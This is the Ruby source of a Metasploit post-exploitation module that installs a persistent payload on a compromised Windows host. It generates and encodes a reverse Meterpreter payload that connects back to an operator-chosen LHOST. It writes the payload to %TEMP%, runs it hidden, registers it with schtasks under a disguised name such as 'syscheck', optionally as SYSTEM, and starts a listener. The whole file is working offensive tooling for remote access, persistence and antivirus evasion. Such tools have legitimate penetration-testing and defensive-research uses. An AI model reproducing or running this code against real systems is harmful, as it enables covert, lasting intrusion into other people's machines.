##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::Services

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Persistent Task Scheduler Payload Installer',
			'Description'   => %q{
				This module will install a payload that is continuously executed at
				pre-defined times or after specified time intervals (depending selected
				method).
				It works by installing a payload and adding it to Windows Task Scheduler.

				Using the MSF action will generate & transfer a reverse Meterpreter
				payload.

				Otherwise, the CUSTOM action will transfer a binary of your choosing
				to the remote host to be used as the payload.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'g0tmi1k',
				],
			'Platform'      => [ 'win' ],
			'Actions'       =>
				[
					[	'MSF',
						{
							'Description' => 'Let Metasploit generate a Meterpeter payload.'
						}
					],
					[	'CUSTOM',
						{
							'Description' => 'Use a custom binary file as the payload.'
						}
					]
				],
			'DefaultAction' => 'MSF',
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new('EXEC',       [true,  'Execute the payload as soon as it\'s uploaded.', true]),
				OptBool.new('HANDLER',    [true,  'Start a multi/handler to receive the session.', true]),
				OptEnum.new('FREQUENCY',  [true,  'How regularly often should it be executed.', 'MINUTE', ['MINUTE', 'HOURLY', 'DAILY', 'ONSTART','ONLOGON', 'NOW']]),   #  'WEEKLY', 'MONTHLY', 'ONCE', 'ONIDLE', 'ONEVENT'
				OptEnum.new('USER',       [true,  'Who to execute the payload as.', 'SYSTEM', ['USER','SYSTEM']]),
				OptInt.new('AMOUNT',      [false, 'Repeat every \'AMOUNT\' times of \'FREQUENCY\'.', 5]),
				OptString.new('NAME',     [false, 'Task name to use.']),
				OptString.new('PASSWORD', [false,  'Execute the payload as soon as it\'s uploaded.']),
				OptString.new('PATH',     [true,  'PATH to write payload', '%TEMP%']),
				OptString.new('USERNAME', [false,  'Execute the payload as soon as it\'s uploaded.']),
				# ACTION=MSF
				OptAddress.new('LHOST',     [false, 'IP for Meterpeter payload to connect to.']),
				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
				OptInt.new('LPORT',         [false, 'Port for Meterpeter payload to connect to.']),
				# ACTION=CUSTOM
				OptString.new('REXE',     [false, 'Local path to the custom executable to use remotely.']),
				OptString.new('REXENAME', [false, 'The filename of the custom executable to use on the remote host.'])
			], self.class)

		register_advanced_options(
			[
				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.', 5]),
				OptString.new('ENCODER', [false, 'Encoder name to use for encoding.', 'x86/shikata_ga_nai']),
				OptString.new('OPTIONS', [false, 'Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.']),
				OptString.new('TEMPLATE',   [false, 'Alternate Windows PE file to use as a template for Meterpreter.']),

			], self.class)
	end

	# Run method for when run command is issued
	#-------------------------------------------------------------------------------
	def run
		# Set vars
		action = datastore['ACTION'] || 'MSF'
		encoder = datastore['ENCODER']
		exec = datastore['EXEC']
		freqamount = datastore['AMOUNT']
		freq = datastore['FREQUENCY'].downcase
		handler =  datastore['HANDLER']
		iterations = datastore['ITERATIONS']
		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		password = datastore['PASSWORD']
		path = datastore['PATH'] || expand_path("%TEMP%")
		payload_type = datastore['PAYLOAD_TYPE']
		rexe = datastore['REXE']
		rexename = datastore['REXENAME']
		taskname = datastore['NAME'] || "syscheck#{rand(1000)}"
		template = datastore['TEMPLATE']
		user = datastore['USER']
		username = datastore['USERNAME']
		@clean_up_rc = ""
		payload = "windows/meterpreter/reverse_tcp"
		result = nil
		begin
			host, port = session.session_host, session.session_port
		rescue => e
			print_error("Couldn't connect to session")
			return nil
		end

		# Check user input
		if action.upcase == 'MSF'
			print_status("Action: MSF (will generate a new payload for use)")

			if lhost.nil? or lhost.empty?
				print_error("Please set LHOST")
				return
			end

			if not lport.between?(1, 65535)
				print_error("Please set LPORT")
				return
			end

			# Check to see if the template file actually exists
			if template
				if not ::File.exists?(template)
					print_error "Template file doesn't exists"
					return
				end
			end

			# Set the 'correct' payload
			case payload_type
				when /TCP/i
					payload = "windows/meterpreter/reverse_tcp"
				when /HTTP/i
					payload = "windows/meterpreter/reverse_http"
				when /HTTPS/i
					payload = "windows/meterpreter/reverse_https"
			end
		elsif action.upcase == 'CUSTOM'
			print_status("Action: CUSTOM (using a custom binary: #{rexe})")

			if rexe.nil? or rexe.empty?
				print_error("Please set REXE")
				return
			end

			if not ::File.exist?(rexe)
				print_error("REXE (#{rexe}) doesn't exist!")
				return
			end

			if rexename.nil? or rexename.empty?
				rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
			end

			if not rexename =~ /\.exe$/
				rexename = "#{rexe}.exe"
			end
		else
			print_error("Unknwon ACTION (#{action.name.upcase})")
			return
		end

		# Making sure the user hasn't asked anything too crazy for starting time
		case freq
			when "minute"
				if not freqamount.between?(1, 1439)
					print_error("'AMOUNT' (#{freqamount}) is wrong for #{freq}")
					return
				end
			when "hourly"
				if not freqamount.between?(1, 23)
					print_error("'AMOUNT' (#{freqamount}) is wrong for #{freq}")
					return
				end
			when "daily"
				if not freqamount.between?(1, 365)
					print_error("'AMOUNT' (#{freqamount}) is wrong for #{freq}")
					return
				end
		end

		# Start!
		print_status("Running module against: #{sysinfo['Computer']}")

		if not check_service()
			print_error("Quitting...")
			return
		end

		# Create/load payload
		if action.upcase == 'MSF'
			pay = create_payload(payload, lhost, lport, opts = "")
			raw = pay_gen(pay, encoder, iterations)
			script = create_script(template, raw)
			script_on_target = write_to_target(script, path)
		else
			raw = create_payload_from_file(rexe)
			script_on_target = write_to_target(raw, path, rexename)
		end

		if not script_on_target
			print_error("Stopping...")
			return
		end

		# Start handler if set
		create_multihand(payload, lhost, lport) if handler

		# Initial execution of payload (if set)
		if exec
			target_exec(script_on_target)
		end

		# This is where the magic happens, adding it to the task scheduler
		result = do_schtasks(freq, script_on_target, taskname, freqamount, user, username, password)

		if result.nil?
			print_error("Quitting...")
			return
		end

		# Generate clean up file
		clean_rc = log_file()
		file_local_write(clean_rc, @clean_up_rc)
		print_status("Cleanup Meterpreter RC file: #{clean_rc}")

		report_note(:host => host,
			:type => "host.persistance.cleanup",
			:data => {
				:local_id => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:commands => @clean_up_rc
			}
		)
	end

	# Generate raw payload
	#-------------------------------------------------------------------------------
	def pay_gen(pay, encoder, iterations)
		raw = pay.generate
		if encoder
			if enc_compat(pay, encoder)
				print_status("Encoding with #{encoder}")
				enc = framework.encoders.create(encoder)
				(1..iterations).each do |i|
					print_status("\tRunning iteration #{i}")
					raw = enc.encode(raw, nil, nil, "Windows")
				end
			end
		end
		return raw
	end

	# Check if encoder specified is in the compatible ones
	#-------------------------------------------------------------------------------
	def enc_compat(payload, encoder)
		compat = false
		payload.compatible_encoders.each do |e|
			if e[0] == encoder.strip
				compat = true
			end
		end
		return compat
	end

	# Create a payload given a name, lhost and lport, additional options
	#-------------------------------------------------------------------------------
	def create_payload(name, lhost, lport, opts = "")
		pay = session.framework.payloads.create(name)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport

		if not opts.empty?
			opts.split(",").each do |o|
				opt,val = o.split("=", 2)
				pay.datastore[opt] = val
			end
		end

		# Validate the options for the module
		pay.options.validate(pay.datastore)
		return pay
	end

	# Function for creating payload
	#-------------------------------------------------------------------------------
	def create_script(altexe, raw)
		if not altexe.nil?
			vbs = ::Msf::Util::EXE.to_executable(session.framework, raw, {:persist => true, :template => altexe})
		else
			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true})
		end
		print_status("Payload is #{vbs.length} bytes long")
		return vbs
	end

	# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end

	# Function for writing payload to target host
	#-------------------------------------------------------------------------------
	def write_script_to_target(vbs)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		fd = session.fs.file.new(tempvbs, "wb")
		fd.write(vbs)
		fd.close
		print_good("Payload written to: #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end

	# Method for checking if a listener for a given IP and port is present
	# will return true if a conflict exists and false if none is found
	#-------------------------------------------------------------------------------
	def check_for_listener(lhost, lport)
		conflict = false
		client.framework.jobs.each do |k,j|
			if j.name =~ / multi\/handler/
				current_id = j.jid
				current_lhost = j.ctx[0].datastore["LHOST"]
				current_lport = j.ctx[0].datastore["LPORT"]
				if lhost == current_lhost and lport == current_lport.to_i
					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
					conflict = true
				end
			end
		end
		return conflict
	end

	# Starts a multi/handler session
	#-------------------------------------------------------------------------------
	def create_multihand(payload, lhost, lport)
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not check_for_listener(lhost,lport)
			# Set options for module
			mul = session.framework.exploits.create("multi/handler")
			mul.share_datastore(pay.datastore)
			mul.datastore['WORKSPACE'] = client.workspace
			mul.datastore['PAYLOAD'] = payload
			mul.datastore['EXITFUNC'] = 'thread'
			mul.datastore['ExitOnSession'] = false
			# Validate module options
			mul.options.validate(mul.datastore)
			# Execute showing output
			mul.exploit_simple(
				'Payload'     => mul.datastore['PAYLOAD'],
				'LocalInput'  => self.user_input,
				'LocalOutput' => self.user_output,
				'RunAsJob'    => true
			)
		else
			print_error("Could not start handler!")
			print_error("A job is listening on the same port")
		end
	end

	# Function to execute payload on target and return the PID of the process
	#-------------------------------------------------------------------------------
	def target_exec(script_on_target)
		print_status("Executing payload")
		proc = action == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
			session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
		print_good("Payload executed (PID: #{proc.pid})")
		@clean_up_rc << "kill #{proc.pid}\n"
		return proc.pid
	end

	# Uses 'schtasks' to setup a task
	#-------------------------------------------------------------------------------
	def do_schtasks(freq, cmd, taskname, freqamount, user, username, password)
		execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\""   # Command we will be executing
		success = false                                                  # Will be 'true' when its successfully executed

	    # UAC can cause 'issues'
		if is_uac_enabled?   #or if is_system? or is_admin?
			print_warning("UAC is enabled.")
		#	return nil
		end

		# Add to command that we will execute
		case freq
			when "onstart"
				execmd = "#{execmd} /sc onstart"
			when "onlogon"
				execmd = "#{execmd} /sc onlogon"
			when "hourly"
				execmd = "#{execmd} /sc hourly /mo #{freqamount}"
			when "daily"
				execmd = "#{execmd} /sc daily /mo #{freqamount}"
			when "minute"
				execmd = "#{execmd} /sc minute /mo #{freqamount}"
			when "now"
				execmd = "#{execmd} /sc once /st 00:00:00"
			else
				print_error("Something went wrong! #1")
				return
		end

		if user == 'USER'
			if username
				# If there is a username, add it onto the end of the command
				if (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)   # Vista and higher
					execmd = "#{execmd} /s #{sysinfo['Computer']} /ru #{username}"
					execmd = "#{execmd} /rp #{password}" if password
				else   # XP
					execmd = "#{execmd} /s \\\\#{sysinfo['Computer']} /u #{username}"
					execmd = "#{execmd} /p #{password}" if password
				end
			elsif password != nil
				print_warning("'PASSWORD' is set, 'USERNAME' isn't.")
			end
		elsif user == 'SYSTEM'
			# Check to see if we could add it to SYSTEM tasks
			if is_system? or is_admin?
				# Lets use SYSTEM access =)
				execmd = "#{execmd} /ru system"

				# Inform user they are not using the details set in options
				print_warning("Executing as SYSTEM, yet 'USERNAME' is set.") if username != nil
			else
				# For the user's own good, don't allow them to even try it...
				print_warning("Trying to add a SYSTEM task from a non SYSTEM account. Switching to 'USER' to USER.")
				user = 'USER'
			end
		end

		# Feedback to the user
		vprint_status("Executing: #{execmd}")
		case freq
			when "onstart"
				print_status("Scheduling task to run every: startup")
			when "onlogon"
				print_status("Scheduling task to run every: user login")
			when "hourly"
				print_status("Scheduling task to run every: #{freqamount} hours")
			when "daily"
				print_status("Scheduling task to run every: #{freqamount} days")
			when "minute"
				print_status("Scheduling task to run every: #{freqamount} minutes")
			when "now"
				print_status("Scheduling task to run: NOW!")
			else
				print_status("Scheduling task to run every: #{freqamount} #{freq}")
		end

		# Just in case something goes wrong
		begin
			# Run the command
			r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})

			# Wait whilst the command is running & get respons
			while(d = r.channel.read)
				if d =~ /successfully been created/ or d =~ /will be created under user name/
					success = true
				elsif d =~ /Access is denied/
					print_error("Insufficient privileges (Access is denied)")
					print_status("Could try setting 'USER' as USER, rather than SYSTEM") if user == 'SYSTEM'
					print_status("Could try unsetting 'USERNAME'") if username  # Windows 7
					return nil
				elsif d =~ /Invalid syntax/
					print_error("Unexpected response: #{d}")
					return nil
				elsif d =~ /already exists. Do you want to replace it/          # XP can't force overwrite it (missing /f)
					print_error("There is already a task called: #{taskname}")
					return nil
				elsif d =~ /Please enter the run as password for/
					print_error("Target is asking for a username/password. Please set 'USERNAME' and try again, or switch 'USER' to SYSTEM.")
					return nil
				elsif d =~ /User credentials are not allowed on the local machine/
					print_error("User (#{taskname}) isn't able to schedule task.")
					return nil
				elsif d =~ /Invalid value for/
					print_error("The wrong amount (#{freqamount}) isn't right with #{freq}.")
					return nil
				else
					print_error("Unknown repsonse: #{d}")
					return nil
				end
			end
		# ...We don't want to end up here
		rescue => e
			print_error("Failed to execute scheduling command. #1")
			return nil
		end

		# Was the command successfull?
		if success
			print_good("Scheduled task (#{taskname}) has been successfully created!")
			@clean_up_rc << "schtasks /delete /tn #{taskname} /f\n"

			if freq == "now"
				if username == nil
					session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname}")
				else
					session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /u #{username} /p #{password}")
				end
			end
		else
			print_error("Failed to create scheduled task. #2")
			return nil
		end

		# Close channel interaction
		r.channel.close
		r.close
		return true
	end

	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_to_target(vbs, path, rexename="")
		tempdir = session.fs.file.expand_path(path)
		if rexename
			tempvbs = "#{tempdir}\\#{rexename}"
		else
			tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		end

		if file? tempvbs
			print_warning("File #{tempvbs} already exists... Removing...")
			file_rm(tempvbs)
		end

		begin
			fd = session.fs.file.new(tempvbs, "wb")
			fd.write(vbs)
			fd.close
		rescue => e
			print_error("Couldn't write to #{tempvbs}")
			return nil
		end

		print_good("Payload written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end

	# Function to read in custom binary
	#-------------------------------------------------------------------------------
	def create_payload_from_file(exec)
		vprint_status("Payload: #{exec}")
		return ::IO.read(exec)
	end

	# Function to check to see if the service is running or not
	#-------------------------------------------------------------------------------
	def check_service()
		vprint_status("Checking to see if Schedule service is running")
		# Just in case something goes wrong
		begin
			# Run the command
			r = session.sys.process.execute("cmd.exe /c sc query Schedule", nil, {'Hidden' => 'true','Channelized' => true})

			# Wait whilst the command is running & get respons
			while(d = r.channel.read)
				if d =~ /RUNNING/ or d =~ /will be created under user name/
					vprint_good("Task Scheduler service is running")
				else
					print_error("Task Scheduler service isn't running!")
					return nil
				end
			end
		# ...We don't want to end up here
		rescue => e
			print_error("Failed to check if scheduling service is running")
			return nil
		end

		# Close channel interaction
		r.channel.close
		r.close
		return true
	end
end
